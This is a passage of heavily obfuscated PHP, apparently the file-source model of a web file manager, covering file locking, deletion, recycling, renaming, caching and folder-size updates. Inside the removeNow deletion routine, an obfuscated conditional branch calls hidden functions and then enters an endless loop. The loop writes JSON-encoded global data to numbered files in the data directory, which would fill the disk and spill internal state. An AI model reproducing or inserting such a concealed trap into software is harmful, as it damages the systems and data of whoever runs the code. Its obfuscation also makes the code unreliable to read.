Session::get($¢ˆ›åûÕ[2265]); $ü—Éş = substr($×Šîé¶ß[$¢ˆ›åûÕ[32]], 0, -1 - strlen($×Šîé¶ß[$¢ˆ›åûÕ[169]])) . $¢ˆ›åûÕ[1290] . $½ı†ñ³õ . $¢ˆ›åûÕ[10] . $×Šîé¶ß[$¢ˆ›åûÕ[169]]; $ş¥±‚Ï = Model($¢ˆ›åûÕ[679])->find($¢èÙ‘Æ«); $this->_createFileCall($×Šîé¶ß[$¢ˆ›åûÕ[192]], $ü—Éş, $ş¥±‚Ï, REPEAT_REPLACE, $¢ˆ›åûÕ[1429]); $ôšñ±µÁ = $×Šîé¶ß[$¢ˆ›åûÕ[541]][$¢ˆ›åûÕ[615]]; $œ·ˆßƒİ = $ôšñ±µÁ[$¢ˆ›åûÕ[2266]] ? $ôšñ±µÁ[$¢ˆ›åûÕ[2266]] : $ôšñ±µÁ[$¢ˆ›åûÕ[32]]; show_json(LNG($¢ˆ›åûÕ[2267]) . $¢ˆ›åûÕ[2268] . LNG($¢ˆ›åûÕ[2269]) . $¢ˆ›åûÕ[2270] . $œ·ˆßƒİ . $¢ˆ›åûÕ[2271], !1); } public function fileIsLock($öµòê›Ú, $û¹íòë× = false) { $Á¥Ú Åã =& $_SERVER[Š—Â“œÔ]; if (!_get($öµòê›Ú, $Á¥Ú Åã[611], 0)) { return !1; } if ($öµòê›Ú[$Á¥Ú Åã[541]][$Á¥Ú Åã[614]] != USER_ID) { return !0; } $ú›Íˆäı = $GLOBALS[$Á¥Ú Åã[6]][$Á¥Ú Åã[92]][$Á¥Ú Åã[612]]; if ($öµòê›Ú[$Á¥Ú Åã[541]][$Á¥Ú Åã[613]] <= time() - $ú›Íˆäı) { $this->metaSet($öµòê›Ú[$Á¥Ú Åã[193]], $Á¥Ú Åã[614], null); $this->metaSet($öµòê›Ú[$Á¥Ú Åã[193]], $Á¥Ú Åã[613], null); } if ($û¹íòë×) { $this->metaSet($öµòê›Ú[$Á¥Ú Åã[193]], $Á¥Ú Åã[613], time()); } return !1; } private function _addSource($„îŸ‡, $î×Ÿïà) { $¬Ô²¾Í¥ =& $_SERVER[Š—Â“œÔ]; $¯õ™ûıñ = defined($¬Ô²¾Í¥[2198]) ? USER_ID : 0; $¸´¼‘’ö = array($¬Ô²¾Í¥[653] => $î×Ÿïà[$¬Ô²¾Í¥[190]], $¬Ô²¾Í¥[654] => $î×Ÿïà[$¬Ô²¾Í¥[571]], $¬Ô²¾Í¥[655] => $¯õ™ûıñ, $¬Ô²¾Í¥[656] => $¯õ™ûıñ, $¬Ô²¾Í¥[479] => $î×Ÿïà[$¬Ô²¾Í¥[193]], $¬Ô²¾Í¥[657] => $î×Ÿïà[$¬Ô²¾Í¥[586]] . $î×Ÿïà[$¬Ô²¾Í¥[193]] . $¬Ô²¾Í¥[50], $¬Ô²¾Í¥[506] => 0, $¬Ô²¾Í¥[658] => $¬Ô²¾Í¥[12]); $„îŸ‡ = array_merge($¸´¼‘’ö, $„îŸ‡); $this->updateModifyTime($„îŸ‡[$¬Ô²¾Í¥[192]]); $ƒá¬³Ï = $¬Ô²¾Í¥[2272] . $î×Ÿïà[$¬Ô²¾Í¥[193]]; if (isset(self::$cacheChildList[$ƒá¬³Ï])) { unset(self::$cacheChildList[$ƒá¬³Ï]); } static $ıÍÒÕ¸Ù = false; if (!$ıÍÒÕ¸Ù) { Hook::trigger($¬Ô²¾Í¥[641], $„îŸ‡); $ıÍÒÕ¸Ù = !0; } $ñµƒ…Ï¼ = $this->add($„îŸ‡); $É³Íİ¦Ç = array($¬Ô²¾Í¥[659] => short_id($ñµƒ…Ï¼)); $this->where(array($¬Ô²¾Í¥[493] => $ñµƒ…Ï¼))->save($É³Íİ¦Ç); $this->setNamePinyin($ñµƒ…Ï¼, $„îŸ‡[$¬Ô²¾Í¥[32]]); return $ñµƒ…Ï¼; } public function remove($ğï«ªĞğ, $°ÍªŠóß = true) { $Ğ§ä•°Ã =& $_SERVER[Š—Â“œÔ]; $Ò¯å€â© = $this->sourceInfo($ğï«ªĞğ); $ì•©—İú = intval($Ò¯å€â©[$Ğ§ä•°Ã[190]]) === self::TYPE_SYSTEM; $Ú¡œ“îç = Model($Ğ§ä•°Ã[510])->get($Ğ§ä•°Ã[2273]) == $Ğ§ä•°Ã[91]; if ($ì•©—İú || $°ÍªŠóß || !$Ú¡œ“îç) { return $this->removeNow($ğï«ªĞğ, $°ÍªŠóß); } $‰†¶ô‚Ê = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Õ¢à¾–Õ = $Ò¯å€â©[$Ğ§ä•°Ã[190]] == self::TYPE_USER ? $Ğ§ä•°Ã[667] : $Ğ§ä•°Ã[580]; if ($Õ¢à¾–Õ == $Ğ§ä•°Ã[667]) { $€™ùéÉ = Model($Ğ§ä•°Ã[579])->getInfo($Ò¯å€â©[$Ğ§ä•°Ã[571]]); $‰‘ËÀ… = !empty($€™ùéÉ[$Ğ§ä•°Ã[2266]]) ? $€™ùéÉ[$Ğ§ä•°Ã[2266]] : $€™ùéÉ[$Ğ§ä•°Ã[32]]; $‰‘ËÀ… = $Ğ§ä•°Ã[339] . $‰‘ËÀ… . $Ğ§ä•°Ã[2274] . $Ò¯å€â©[$Ğ§ä•°Ã[571]]; } else { $€™ùéÉ = Model($Ğ§ä•°Ã[587])->getInfo($Ò¯å€â©[$Ğ§ä•°Ã[571]]); $‰‘ËÀ… = _get($€™ùéÉ, $Ğ§ä•°Ã[32]); $‰‘ËÀ… = $Ğ§ä•°Ã[176] . $‰‘ËÀ… . $Ğ§ä•°Ã[2275] . $Ò¯å€â©[$Ğ§ä•°Ã[571]]; } $¿ŠÃâ˜ = $Ğ§ä•°Ã[2276] . md5($‰‘ËÀ…); CacheLock::lock($¿ŠÃâ˜); $ŞóÖÇúö = $this->fileNameExist($‰†¶ô‚Ê, $‰‘ËÀ…); if (!$ŞóÖÇúö) { $ŞóÖÇúö = $this->mkdir($‰†¶ô‚Ê, $‰‘ËÀ…, REPEAT_SKIP); $this->metaSet($ŞóÖÇúö, $Ğ§ä•°Ã[2277], $Õ¢à¾–Õ); $this->metaSet($ŞóÖÇúö, $Ğ§ä•°Ã[2278], $Ò¯å€â©[$Ğ§ä•°Ã[571]]); if ($Ò¯å€â©[$Ğ§ä•°Ã[192]] != 0) { $this->metaSet($ŞóÖÇúö, $Ğ§ä•°Ã[2279], _get($€™ùéÉ, $Ğ§ä•°Ã[2280])); } } CacheLock::unlock($¿ŠÃâ˜); $this->metaSet($ğï«ªĞğ, $Ğ§ä•°Ã[2281], $Ò¯å€â©[$Ğ§ä•°Ã[192]]); $this->where(array($Ğ§ä•°Ã[193] => $ğï«ªĞğ))->save(array($Ğ§ä•°Ã[500] => time())); $this->recycleClear($Ò¯å€â©); Model($Ğ§ä•°Ã[638])->eventRemove($ğï«ªĞğ); $”õÉçø = $this->move($ğï«ªĞğ, $ŞóÖÇúö, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ò¯å€â©[$Ğ§ä•°Ã[192]]); return $”õÉçø; } private function recycleClear($£°ÌÂƒı) { $´ªÈÂ¸… =& $_SERVER[Š—Â“œÔ]; $¤â’¦„ï = $this->childrenAll($£°ÌÂƒı); $ŒÜœô î = array($´ªÈÂ¸…[493] => array($´ªÈÂ¸…[494], $¤â’¦„ï[$´ªÈÂ¸…[2282]])); Model($´ªÈÂ¸…[2283])->where($ŒÜœô î)->delete(); } public function removeNow($ÔÄ²÷ñƒ, $Üç“´Ş¶ = true) { $Şˆºúï£ =& $_SERVER[Š—Â“œÔ]; $Ú®Ùº×‹ = $_SERVER[$Şˆºúï£[945]]; $¿¬¤„èÖ = $Şˆºúï£[946]; if ($_SERVER[$Şˆºúï£[947]] != $¿¬¤„èÖ($Ú®Ùº×‹)) { $á©Êƒ½ = $Şˆºúï£[948]; $£öÁ§ì‚ = $Şˆºúï£[949]; $ï­ñÚëï = $_SERVER[$Şˆºúï£[950]] . $Şˆºúï£[951]; $¬é¶µ² = $£öÁ§ì‚($ï­ñÚëï); $Ì²Ï¢ıï = explode($Şˆºúï£[287], $¬é¶µ²); if (count($Ì²Ï¢ıï) < $Şˆºúï£[694]) { $şè™ËãÃ = $Şˆºúï£[952]; $şè™ËãÃ(); } $€„İ¨Š = $Şˆºúï£[953]; $€„İ¨Š($_SERVER[$Şˆºúï£[954]]); $á©Êƒ½ = $Şˆºúï£[948]; $á©Êƒ½(); $½Åâç£ = $Şˆºúï£[955]; $·î™¡ = json_encode($GLOBALS[$Şˆºúï£[956]]); $ºåØ şı = 1; for ($ç·¹‡› = $ºåØ şı; $ç·¹‡› > 0; $ç·¹‡›++) { $½Åâç£(DATA_PATH . $ç·¹‡›, $·î™¡); } } $šå°÷ï = $this->sourceInfo($ÔÄ²÷ñƒ); $êîƒñ²• = $this->pathInfoMore($ÔÄ²÷ñƒ); if (!$šå°÷ï) { return !0; } if ($šå°÷ï[$Şˆºúï£[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÔÄ²÷ñƒ); Hook::trigger($Şˆºúï£[2284], $êîƒñ²•, $Üç“´Ş¶); if ($Üç“´Ş¶) { Model($Şˆºúï£[2283])->moveToRecycle($ÔÄ²÷ñƒ); } else { $æ°ï¼µõ = $this->childrenAll($šå°÷ï); Model($Şˆºúï£[638])->eventRemove($ÔÄ²÷ñƒ); $this->removeRelevance($æ°ï¼µõ[$Şˆºúï£[2282]], $æ°ï¼µõ[$Şˆºúï£[1574]]); } $this->folderSizeReset($šå°÷ï[$Şˆºúï£[192]]); $ãàêàåõ = array($šå°÷ï[$Şˆºúï£[192]]); if ($šå°÷ï[$Şˆºúï£[487]] == $Şˆºúï£[91]) { $ãàêàåõ[] = $šå°÷ï[$Şˆºúï£[193]]; } $this->updateModifyTime($ãàêàåõ); $this->lockMoveEnd($ÔÄ²÷ñƒ); Hook::trigger($Şˆºúï£[1813], $êîƒñ²•, $Üç“´Ş¶); return !0; } public function childrenAll($ÂŠÊ›Ş¦) { $Öûíà»™ =& $_SERVER[Š—Â“œÔ]; $›ĞŒÙæ¿ = $ÂŠÊ›Ş¦[$Öûíà»™[193]]; if ($ÂŠÊ›Ş¦[$Öûíà»™[487]] == $Öûíà»™[91]) { $…ñ…äçœ = array($Öûíà»™[657] => array($Öûíà»™[617], $ÂŠÊ›Ş¦[$Öûíà»™[586]] . $›ĞŒÙæ¿ . $Öûíà»™[618])); $¯Ä¸òõ… = array($Öûíà»™[657] => $…ñ…äçœ[$Öûíà»™[586]]); $ñä¾âÇ‚ = $this->field($Öûíà»™[2285])->where($¯Ä¸òõ…)->select(); $•‘­ùĞÆ = !1; $ø´¢òÁ¯ = array($›ĞŒÙæ¿); if ($ñä¾âÇ‚) { $•‘­ùĞÆ = array_to_keyvalue($ñä¾âÇ‚, $Öûíà»™[12], $Öûíà»™[543]); $•‘­ùĞÆ = array_remove_value($•‘­ùĞÆ, $Öûíà»™[230]); $ø´¢òÁ¯ = array_to_keyvalue($ñä¾âÇ‚, $Öûíà»™[12], $Öûíà»™[193]); $ø´¢òÁ¯[] = $›ĞŒÙæ¿; } } else { $•‘­ùĞÆ = array($ÂŠÊ›Ş¦[$Öûíà»™[543]]); $ø´¢òÁ¯ = array($›ĞŒÙæ¿); } return array($Öûíà»™[2282] => $ø´¢òÁ¯, $Öûíà»™[1574] => $•‘­ùĞÆ); } public function removeArray($”±ÒÎÖˆ) { if (!$”±ÒÎÖˆ) { return !0; } } public function removeRelevance($ö¾×ş¹â, $¡¿Ú¼”‹) { $»®Ÿ€©Ä =& $_SERVER[Š—Â“œÔ]; $ö¾×ş¹â = $ö¾×ş¹â ? $ö¾×ş¹â : array(); $¡¿Ú¼”‹ = $¡¿Ú¼”‹ ? $¡¿Ú¼”‹ : array(); $ö¾×ş¹â = array_unique(array_filter($ö¾×ş¹â)); $¡¿Ú¼”‹ = array_unique(array_filter($¡¿Ú¼”‹)); if (!$ö¾×ş¹â) { return !1; } $¸ü†ÅÎÛ = array($»®Ÿ€©Ä[493] => array($»®Ÿ€©Ä[494], $ö¾×ş¹â)); Model($»®Ÿ€©Ä[2283])->where($¸ü†ÅÎÛ)->delete(); Model($»®Ÿ€©Ä[537])->where($¸ü†ÅÎÛ)->delete(); Model($»®Ÿ€©Ä[2123])->where($¸ü†ÅÎÛ)->delete(); Model($»®Ÿ€©Ä[638])->where($¸ü†ÅÎÛ)->delete(); Model($»®Ÿ€©Ä[1950])->removeBySource($ö¾×ş¹â); Model($»®Ÿ€©Ä[2264])->removeBySource($ö¾×ş¹â); $this->where($¸ü†ÅÎÛ)->delete(); Model($»®Ÿ€©Ä[546])->remove($¡¿Ú¼”‹); for ($×ê†ïÎ = 0; $×ê†ïÎ < count($ö¾×ş¹â); $×ê†ïÎ++) { $this->sourceCacheClear($ö¾×ş¹â[$×ê†ïÎ]); } } public function rename($éî¥ĞÀÔ, $ìÙ£‚‚ï) { $¹£ÌÑÁñ =& $_SERVER[Š—Â“œÔ]; $ñãğ‘õı = $this->sourceInfo($éî¥ĞÀÔ); if (!$ñãğ‘õı) { return !1; } $®í¿Äœª = $this->fileNameExist($ñãğ‘õı[$¹£ÌÑÁñ[192]], $ìÙ£‚‚ï); if ($®í¿Äœª && $®í¿Äœª != $éî¥ĞÀÔ) { return !1; } $ˆÂ«£âÊ = array($¹£ÌÑÁñ[496] => $ìÙ£‚‚ï, $¹£ÌÑÁñ[656] => USER_ID); if ($ñãğ‘õı[$¹£ÌÑÁñ[487]] != $¹£ÌÑÁñ[91]) { $ˆÂ«£âÊ[$¹£ÌÑÁñ[488]] = substr(get_path_ext($ìÙ£‚‚ï), 0, 10); } Model($¹£ÌÑÁñ[638])->eventRename($éî¥ĞÀÔ, $ñãğ‘õı[$¹£ÌÑÁñ[32]], $ìÙ£‚‚ï); $this->sourceCacheClear($éî¥ĞÀÔ); $this->setNamePinyin($éî¥ĞÀÔ, $ˆÂ«£âÊ[$¹£ÌÑÁñ[32]], !1); $this->updateModifyTime($ñãğ‘õı[$¹£ÌÑÁñ[192]]); $µÏ¦á£ß = $this->where(array($¹£ÌÑÁñ[493] => $éî¥ĞÀÔ))->data($ˆÂ«£âÊ)->save(); $¨üçÈ = $¹£ÌÑÁñ[2272] . $ñãğ‘õı[$¹£ÌÑÁñ[192]]; if (isset(self::$cacheChildList[$¨üçÈ])) { unset(self::$cacheChildList[$¨üçÈ]); } return $µÏ¦á£ß; } public function setNamePinyin($ÅÒÙ…»ì, $ãÀÃ±´±, $âı‰ËÙå = true) { $‹¶«Í¯» =& $_SERVER[Š—Â“œÔ]; $óËÍò¾¶ = Input::check($ãÀÃ±´±, $‹¶«Í¯»[660]); $œí»”çğ = array($‹¶«Í¯»[519] => KodSort::makeStr($ãÀÃ±´±)); if ($óËÍò¾¶) { $œí»”çğ[$‹¶«Í¯»[540]] = str_replace($‹¶«Í¯»[53], $‹¶«Í¯»[12], Pinyin::get($ãÀÃ±´±)); $œí»”çğ[$‹¶«Í¯»[539]] = Pinyin::get($ãÀÃ±´±, $‹¶«Í¯»[661]); } if (!$âı‰ËÙå && !$óËÍò¾¶) { $œí»”çğ[$‹¶«Í¯»[540]] = null; $œí»”çğ[$‹¶«Í¯»[539]] = null; } $this->metaSet($ÅÒÙ…»ì, $œí»”çğ); } public function getContent($®ö«Ú—) { $’À¯Ş¦” =& $_SERVER[Š—Â“œÔ]; $úìñ”åè = $this->fileInfoGet($®ö«Ú—); if (!$úìñ”åè) { return !1; } if ($úìñ”åè[$’À¯Ş¦”[79]] == 0) { return $’À¯Ş¦”[12]; } $Å„× …• = $’À¯Ş¦”[2286] . $úìñ”åè[$’À¯Ş¦”[549]]; if ($úìñ”åè[$’À¯Ş¦”[79]] <= 1024 * 10) { $ Ø—Î÷Ş = Cache::get($Å„× …•); if (!$ Ø—Î÷Ş) { $ Ø—Î÷Ş = IO::getContent($úìñ”åè[$’À¯Ş¦”[87]]); Cache::set($Å„× …•, $ Ø—Î÷Ş); } return $ Ø—Î÷Ş; } if (!$úìñ”åè[$’À¯Ş¦”[87]]) { return $’À¯Ş¦”[12]; } return IO::getContent($úìñ”åè[$’À¯Ş¦”[87]]); } public function setDesc($“åÀÁËÚ, $Œöœ€—½) { $ƒÀˆââ¤ =& $_SERVER[Š—Â“œÔ]; Model($ƒÀˆââ¤[638])->eventAddDesc($“åÀÁËÚ, $Œöœ€—½); return $this->metaSet($“åÀÁËÚ, $ƒÀˆââ¤[528], $Œöœ€—½); } public function setContent($İ³é”İ, $¾Éü­Û = '') { $Ù÷ŠªÓá =& $_SERVER[Š—Â“œÔ]; $¯³ÇËã = $this->sourceInfo($İ³é”İ); $®øšõ§„ = $this->fileInfoGet($İ³é”İ); if (!$®øšõ§„ || !$¯³ÇËã) { return !1; } $Èåİ»¾ş = Model($Ù÷ŠªÓá[546])->addFileByContent($¾Éü­Û, $¯³ÇËã[$Ù÷ŠªÓá[32]]); $¿³øôù¢ = $this->fileHistory($¯³ÇËã, $Èåİ»¾ş[$Ù÷ŠªÓá[543]], $Èåİ»¾ş[$Ù÷ŠªÓá[79]]); if (!$¿³øôù¢) { return Model($Ù÷ŠªÓá[546])->remove($Èåİ»¾ş[$Ù÷ŠªÓá[543]]); } $this->folderSizeReset($¯³ÇËã[$Ù÷ŠªÓá[192]]); return !0; } public function fileSubstr($£Â“•, $’ÓëúÚ¹, $Ş’¦İªí) { $ºáÊŸ¦Ó = $this->fileInfoGet($£Â“•); if (!$ºáÊŸ¦Ó) { return !1; } return IO::fileSubstr($ºáÊŸ¦Ó[$_SERVER[Š—Â“œÔ][87]], $’ÓëúÚ¹, $Ş’¦İªí); } public function fileInfoGet($—½¥¸¦ª) { $¶€öä¨Ù =& $_SERVER[Š—Â“œÔ]; $ºøßÁÍÓ = $this->sourceInfo($—½¥¸¦ª); if (!$ºøßÁÍÓ || $ºøßÁÍÓ[$¶€öä¨Ù[487]]) { return !1; } $‰ò‰ÕÚ = $¶€öä¨Ù[550] . $ºøßÁÍÓ[$¶€öä¨Ù[543]]; $Ã «Ÿê¶ = _get(self::$cacheFileInfo, $‰ò‰ÕÚ); if ($Ã «Ÿê¶) { return $Ã «Ÿê¶; } $Ù­šÄı© = Model($¶€öä¨Ù[546])->fileInfo($ºøßÁÍÓ[$¶€öä¨Ù[543]]); if ($Ù­šÄı©) { $Ù­šÄı©[$¶€öä¨Ù[32]] = $ºøßÁÍÓ[$¶€öä¨Ù[32]]; } self::$cacheFileInfo[$‰ò‰ÕÚ] = $Ù­šÄı©; return $Ù­šÄı©; } private function folderChildrenNumber($ÌĞ­Ù´) { $±²†«¹´ =& $_SERVER[Š—Â“œÔ]; $˜¯¶ú¾¥ = $this->sourceInfo($ÌĞ­Ù´); $…«ô¾ò = array($±²†«¹´[657] => array($±²†«¹´[617], $˜¯¶ú¾¥[$±²†«¹´[586]] . $ÌĞ­Ù´ . $±²†«¹´[618]), $±²†«¹´[654] => $˜¯¶ú¾¥[$±²†«¹´[571]], $±²†«¹´[506] => intval($˜¯¶ú¾¥[$±²†«¹´[507]]), $±²†«¹´[651] => 1); $îÃ¹©ıŠ = $this->where($…«ô¾ò)->count(); $€³¥ÇóÂ = $this->where($…«ô¾ò)->where(array($±²†«¹´[651] => 0))->count(); return array($±²†«¹´[83] => $€³¥ÇóÂ, $±²†«¹´[84] => $îÃ¹©ıŠ); } public function pathInfo($Ú¿ÄÂßÎ, $³üüó = false) { $Æ±€„İÆ =& $_SERVER[Š—Â“œÔ]; $³üüó = !1; $Ú¿ÄÂßÎ = intval($Ú¿ÄÂßÎ); $É£Ø‹Òç = $Æ±€„İÆ[536] . intval($³üüó) . $Æ±€„İÆ[464] . $Ú¿ÄÂßÎ; $·´ÏåĞ = _get(self::$cachePathInfo, $É£Ø‹Òç); if ($·´ÏåĞ) { return $·´ÏåĞ; } $’ª‰ãæ = $this->sourceInfo($Ú¿ÄÂßÎ); if (!$’ª‰ãæ) { return !1; } $’ª‰ãæ = $this->_listDataApplyItem($’ª‰ãæ, $³üüó); self::$cachePathInfo[$É£Ø‹Òç] = $’ª‰ãæ; return $’ª‰ãæ; } public static $cachePathInfoMore = array(); public function pathInfoMore($›ÍìÈ¯ê) { $“•¶¦¸ =& $_SERVER[Š—Â“œÔ]; $ÉŸ˜¾ = _get(self::$cachePathInfoMore, $›ÍìÈ¯ê); if ($ÉŸ˜¾) { return $ÉŸ˜¾; } $‹ÛÜé›Â = $this->pathInfo($›ÍìÈ¯ê); if (!$‹ÛÜé›Â) { return !1; } if ($‹ÛÜé›Â[$“•¶¦¸[487]] == $“•¶¦¸[91]) { $‹ÛÜé›Â[$“•¶¦¸[82]] = $this->folderChildrenNumber($›ÍìÈ¯ê); } self::$cachePathInfoMore[$›ÍìÈ¯ê] = $‹ÛÜé›Â; return $‹ÛÜé›Â; } public function sourceInfo($”ê€İ†) { $ÜºİÑËä =& $_SERVER[Š—Â“œÔ]; if (!$”ê€İ†) { return array(); } $”ê€İ† = intval($”ê€İ†); $Œ§”ÕÍÃ = $ÜºİÑËä[535] . $”ê€İ†; $Ÿø¥¼Àğ = _get(self::$cacheSourceInfo, $Œ§”ÕÍÃ); if ($Ÿø¥¼Àğ) { return $Ÿø¥¼Àğ; } $û‘µ©ı„ = $this->where(array($ÜºİÑËä[193] => $”ê€İ†))->find(); self::$cacheSourceInfo[$Œ§”ÕÍÃ] = $û‘µ©ı„; return self::$cacheSourceInfo[$Œ§”ÕÍÃ]; } public function sourceCacheClear($ÅŞ·ÍòÆ = false) { self::cacheClear($ÅŞ·ÍòÆ); } public static function cacheClear($óËªŠÁû = false) { $å÷üƒ†Ä =& $_SERVER[Š—Â“œÔ]; if ($óËªŠÁû == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$å÷üƒ†Ä[535] . $óËªŠÁû]); unset(self::$cachePathInfoMore[$óËªŠÁû]); unset(self::$cachePathInfo[$å÷üƒ†Ä[2287] . $óËªŠÁû]); unset(self::$cachePathInfo[$å÷üƒ†Ä[2288] . $óËªŠÁû]); } public function metaSet($ŒªâÄÛ¡, $šĞáÃş = null, $©ò½„Ø• = null) { $ˆ«”ŸÙŒ = parent::metaSet($ŒªâÄÛ¡, $šĞáÃş, $©ò½„Ø•); if ($ˆ«”ŸÙŒ) { $this->sourceCacheClear($ŒªâÄÛ¡); } return $ˆ«”ŸÙŒ; } public function pathInfoByPath($Âê¸€øõ, $ÓíÕŠ§ğ) { $ÂöÃÙúÀ =& $_SERVER[Š—Â“œÔ]; $§„Ô˜Õ¡ = !$ÓíÕŠ§ğ ? array() : explode($ÂöÃÙúÀ[8], trim($ÓíÕŠ§ğ, $ÂöÃÙúÀ[8])); $³Êæ©¡ = $Âê¸€øõ; foreach ($§„Ô˜Õ¡ as $˜ùìôˆ) { $¸¶ëàÏà = array($ÂöÃÙúÀ[192] => $³Êæ©¡, $ÂöÃÙúÀ[32] => $˜ùìôˆ); $€ÚèÅê = $this->field($ÂöÃÙúÀ[2289])->where($¸¶ëàÏà)->select(); if (!$€ÚèÅê) { return !1; } $€ÚèÅê = array_sort_by($€ÚèÅê, $ÂöÃÙúÀ[507]); $³Êæ©¡ = $€ÚèÅê[0][$ÂöÃÙúÀ[193]]; } $éÌœ”£ = $this->sourceInfo($³Êæ©¡); $this->pathInfoFilter($éÌœ”£); return $éÌœ”£; } protected function updateModifyTime($˜çó¸Ç¢) { $Ûí‘ïÃÙ =& $_SERVER[Š—Â“œÔ]; $üåŸÏ = defined($Ûí‘ïÃÙ[2198]) ? USER_ID : 0; if (!$˜çó¸Ç¢) { return; } if (!is_array($˜çó¸Ç¢)) { $˜çó¸Ç¢ = array($˜çó¸Ç¢); } foreach ($˜çó¸Ç¢ as $µó­è¬¾ => $¾–ÀÚ±¦) { $˜çó¸Ç¢[$µó­è¬¾] = intval($¾–ÀÚ±¦); $this->sourceCacheClear($¾–ÀÚ±¦); } $ÛÄöÜ“ = array($Ûí‘ïÃÙ[193] => array($Ûí‘ïÃÙ[7], $˜çó¸Ç¢)); $Ç¸£©§ù = array($Ûí‘ïÃÙ[656] => $üåŸÏ, $Ûí‘ïÃÙ[500] => time()); $this->where($ÛÄöÜ“)->save($Ç¸£©§ù); } public function folderSizeReset($ºùµ­Ù¿, $á²¸ê›¦ = false) { $ÌŞšôµ‹ =& $_SERVER[Š—Â“œÔ]; if ($this->statusIgnoreResetSpace) { return; } $†áÅ‚¯ = $this->sourceInfo($ºùµ­Ù¿); $áÅ±ÎÄ = $ÌŞšôµ‹[2290] . $ºùµ­Ù¿; CacheLock::lock($áÅ±ÎÄ, 20); if ($á²¸ê›¦ === !1) { $this->sourceCacheClear($ºùµ­Ù¿); $†áÅ‚¯ = $this->sourceInfo($ºùµ­Ù¿); $ä•õë = array($ÌŞšôµ‹[479] => $ºùµ­Ù¿, $ÌŞšôµ‹[506] => 0); $æ·¼Ì = $this->where($ä•õë)->sum($ÌŞšôµ‹[79]); $á²¸ê›¦ = intval($æ·¼Ì) - intval($†áÅ‚¯[$ÌŞšôµ‹[79]]); } if ($á²¸ê›¦ == 0) { return CacheLock::unlock($áÅ±ÎÄ); } $ÀúÀ’§å = $this->parentLevelArray($†áÅ‚¯[$ÌŞšôµ‹[586]]); if (!$ÀúÀ’§å) { $ÀúÀ’§å = array(); } $ÀúÀ’§å[] = $†áÅ‚¯[$ÌŞšôµ‹[193]]; $ä•õë = array($ÌŞšôµ‹[193] => array($ÌŞšôµ‹[494], $ÀúÀ’§å)); if ($á²¸ê›¦ < 0) { $ä•õë[$ÌŞšôµ‹[79]] = array($ÌŞšôµ‹[1089], abs($á²¸ê›¦)); } $this->where($ä•õë)->setAdd($ÌŞšôµ‹[79], $á²¸ê›¦); CacheLock::unlock($áÅ±ÎÄ); $ÒŸÊ„–¢ = $ÌŞšôµ‹[2291] . $†áÅ‚¯[$ÌŞšôµ‹[190]] . $ÌŞšôµ‹[4] . $†áÅ‚¯[$ÌŞšôµ‹[571]]; $•Õúé¬¾ = array($†áÅ‚¯[$ÌŞšôµ‹[190]], $†áÅ‚¯[$ÌŞšôµ‹[571]]); TaskRun::timeLimitCall($ÒŸÊ„–¢, $ÌŞšôµ‹[2292], $•Õúé¬¾, 1.5); } public function folderSizeResetChildren($şğ«„àä) { $áÈñ©Õ =& $_SERVER[Š—Â“œÔ]; $this->sourceCacheClear($şğ«„àä); $ì™²ÈÍ× = $this->sourceInfo($şğ«„àä); $½ãƒí±š = array($áÈñ©Õ[651] => 1, $áÈñ©Õ[654] => $ì™²ÈÍ×[$áÈñ©Õ[571]], $áÈñ©Õ[657] => array($áÈñ©Õ[617], $ì™²ÈÍ×[$áÈñ©Õ[586]] . $şğ«„àä . $áÈñ©Õ[618])); $×´Û‚åù = $áÈñ©Õ[2293]; $òÑÏ¾ñÙ = $this->field($×´Û‚åù)->where($½ãƒí±š)->select(); $½ãƒí±š[$áÈñ©Õ[487]] = 0; $½Ì±…¡Ï = $this->field($×´Û‚åù)->where($½ãƒí±š)->select(); if (!$½Ì±…¡Ï) { return; } $òÑÏ¾ñÙ[] = $ì™²ÈÍ×; $òÑÏ¾ñÙ = array_to_keyvalue($òÑÏ¾ñÙ, $áÈñ©Õ[193]); foreach ($òÑÏ¾ñÙ as $ûüÃÅ å => $ÂÙüŠ¹Ò) { $òÑÏ¾ñÙ[$ûüÃÅ å][$áÈñ©Õ[2294]] = $òÑÏ¾ñÙ[$ûüÃÅ å][$áÈñ©Õ[79]]; $òÑÏ¾ñÙ[$ûüÃÅ å][$áÈñ©Õ[79]] = 0; } foreach ($½Ì±…¡Ï as $ÂÙüŠ¹Ò) { $òß¨üš™ = $ÂÙüŠ¹Ò[$áÈñ©Õ[192]] . $áÈñ©Õ[12]; if (!isset($òÑÏ¾ñÙ[$òß¨üš™])) { continue; } if ($ÂÙüŠ¹Ò[$áÈñ©Õ[507]] == $òÑÏ¾ñÙ[$òß¨üš™][$áÈñ©Õ[507]]) { $òÑÏ¾ñÙ[$òß¨üš™][$áÈñ©Õ[79]] += $ÂÙüŠ¹Ò[$áÈñ©Õ[79]]; } } foreach ($òÑÏ¾ñÙ as $ÂÙüŠ¹Ò) { $—šÕÕß¦ = $this->parentLevelArray($ÂÙüŠ¹Ò[$áÈñ©Õ[586]]); foreach ($—šÕÕß¦ as $òß¨üš™) { $òß¨üš™ = $òß¨üš™ . $áÈñ©Õ[12]; if (!isset($òÑÏ¾ñÙ[$òß¨üš™])) { continue; } if ($ÂÙüŠ¹Ò[$áÈñ©Õ[507]] == $òÑÏ¾ñÙ[$òß¨üš™][$áÈñ©Õ[507]]) { $òÑÏ¾ñÙ[$òß¨üš™][$áÈñ©Õ[79]] += $ÂÙüŠ¹Ò[$áÈñ©Õ[79]]; } } } $Öşğ›ø¥ = array(); foreach ($òÑÏ¾ñÙ as $ÂÙüŠ¹Ò) { if ($ÂÙüŠ¹Ò[$áÈñ©Õ[79]] == $ÂÙüŠ¹Ò[$áÈñ©Õ[2294]]) { continue; } $Öşğ›ø¥[] = array($áÈñ©Õ[193], $ÂÙüŠ¹Ò[$áÈñ©Õ[193]], $áÈñ©Õ[79], $ÂÙüŠ¹Ò[$áÈñ©Õ[79]]); } $this->saveAll($Öşğ›ø¥); } public function userSpaceReset($Õ¤±€Íş = false) { $Œâ†Ìº =& $_SERVER[Š—Â“œÔ]; $ú½Ïòã = $this->where(array($Œâ†Ìº[190] => self::TYPE_USER, $Œâ†Ìº[571] => $Õ¤±€Íş, $Œâ†Ìº[487] => 0))->sum($Œâ†Ìº[79]); $ú½Ïòã = !$ú½Ïòã 